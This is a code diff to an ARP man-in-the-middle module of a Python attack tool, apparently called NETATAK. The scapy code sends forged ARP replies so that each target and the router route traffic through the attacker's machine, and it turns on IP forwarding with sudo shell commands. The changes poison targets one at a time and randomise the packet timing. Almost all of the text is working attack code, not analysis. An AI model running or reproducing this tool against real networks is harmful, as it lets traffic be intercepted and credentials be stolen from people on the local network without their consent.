@@ -18,13 +18,11 @@ along with this program.  If not, see <https://www.gnu.org/licenses/>.
 # ARP MITM
 # This tool will start by requesting details of the Router IP, network address and the subnet mask. It will then conduct
 # an ARP scan on the network and find out which hosts are alive. Once a target list has been generated the program will
-# send an ARP broadcast on the local network, and the machine running NETATAK will act as the
-# default gateway for the network, forwarding traffic to the real default gateway. You will then be able to use Wireshark
+# poison each target (5-10 second delay per target), and the machine running NETATAK will act as the
+# default gateway for the target/network, forwarding traffic to the real default gateway. You will then be able to use Wireshark
 # to monitor the forwarded traffic.
 
-import sys
-import os
-import platform
+from random import randint
 from scapy.all import *
 from netscanner import netscan_main
 
@@ -42,7 +40,8 @@ class arp_mitm:
         self.pktintr = float(pktintr)  # Interval between packets
         self.rtr_scan = {}
         self.rtrmac = ""
-        self.tgt_list_temp = {}
+        self.tgt_list = {}
+
 
         # Linux - IP Forwarding file name
         self.ipforward_file = "/proc/sys/net/ipv4/ip_forward"
@@ -77,22 +76,26 @@ class arp_mitm:
         if self.atkopt == 0:
             # Start ARP MITM
             self.start_arp_mitm()
-        else:
+        elif self.atkopt == 1:
             # Stop ARP MITM
             self.stop_arp_mitm()
+        else:
+            # Invalid option
+            print("{0}[*] Invalid option passed to ARP MITM tool.".format(R))
+            return False
 
     def start_arp_mitm(self):
         print("{0}[*] Starting ARP MITM attack...".format(N))
         print("{0}[*] Turn on IP Forwarding in {1}...".format(N, self.ipforward_file))
         print("{0}[*] Use Wireshark or a similar network analysis tool to monitor the traffic.".format(Y))
-        os.popen("sudo echo '1' > {0}".format(self.ipforward_file))
+        subprocess.Popen("sudo echo '1' > {0}".format(self.ipforward_file), shell=True)
         try:
             while True:
                 for i in self.tgt_list:
                     result = self.tgt_list[i].split('-')
                     send(ARP(op=2, pdst=result[0], psrc=self.rtrip, hwdst=result[1]), count=1, verbose=0)
                     send(ARP(op=2, pdst=self.rtrip, psrc=result[0], hwdst=self.rtrmac), count=1, verbose=0)
-                    time.sleep(5)
+                    time.sleep(randint(5, 10))
                     print("{0}[*] Target %s with MAC Address %s poisoned".format(G) % (result[0], result[1]))
                     continue
         except KeyboardInterrupt:
@@ -106,12 +109,12 @@ class arp_mitm:
             result = self.tgt_list[i].split('-')
             send(ARP(op=2, pdst=result[0], psrc=self.rtrip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.rtrmac), verbose=0, count=5)
             send(ARP(op=2, pdst=self.rtrip, psrc=result[0], hwdst=self.rtrmac, hwsrc=result[1]), verbose=0, count=5)
-            time.sleep(5)
+            time.sleep(randint(5, 10))
             print("{0}[*]Target %s with MAC address %s restored".format(G) % (result[0], result[1]))
 
         # Turn IP Forwarding Off.
         print("{0}[*] Turn off IP Forwarding in {1}...".format(N, self.ipforward_file))
-        os.popen("sudo echo '0' > {0}".format(self.ipforward_file))
+        subprocess.Popen("sudo echo '0' > {0}".format(self.ipforward_file), shell=True)
 
         print("{0}[*] Targets restored. Exiting...".format(G))
         return True
